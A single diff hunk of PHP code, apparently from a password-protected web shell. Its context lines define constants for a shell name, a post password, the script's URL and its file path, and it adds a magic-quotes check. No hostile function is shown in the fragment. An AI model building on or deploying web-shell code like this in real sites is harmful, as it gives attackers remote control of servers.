@@ -10,3 +10,4 @@ define('myaddress',$_SERVER['SCRIPT_FILENAME']);
 define('postpass',$password);
 define('shellname',$shellname);
 define('myurl',$myurl);
+if(@get_magic_quotes_gpc()){
